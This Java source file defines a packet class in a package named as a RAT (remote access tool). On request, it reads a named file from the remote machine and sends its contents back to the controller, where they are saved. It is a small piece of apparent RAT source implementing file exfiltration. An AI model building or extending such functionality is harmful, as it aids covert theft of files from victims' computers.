package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveClient;

public final class DownloadFilePacket extends AbstractPingPongPacket {
	
	private String path;
	
	private byte[] data;
	private String fileName;
	
	public DownloadFilePacket(final String path) {
		this.path = path;
		
		type = REQUEST;
	}
	
	public DownloadFilePacket() {
		this("");
		
		type = DATA;
	}
	
	@Override
	protected void sendRequest(final ActiveClient client) {
		client.writeUTF(path);
	}
	
	@Override
	protected void sendData(final ActiveClient client) {
		client.writeInt(data.length);
		client.write(data);
		client.writeUTF(fileName);
	}
	
	@Override
	protected void receiveRequest(final ActiveClient client) {
		path = client.readUTF();
	}
	
	@Override
	protected void receiveData(final ActiveClient client) {
		final int length = client.readInt();
		
		data = new byte[length];
		
		client.read(data);
		
		fileName = client.readUTF();
		
	}
	
	@Override
	protected void executeRequest(final ActiveClient client) {
		final File file = new File(path);
		
		if (file.exists() && !file.isDirectory()) {
			fileName = file.getName();
			data = FileUtils.readExternalData(path);
			type = DATA;
			
			client.addPacket(this);
		}
	}
	
	@Override
	protected void executeData(final ActiveClient client) {
		FileUtils.writeData(fileName, data);
	}
	
	public String getFileName() {
		return fileName;
	}
	
}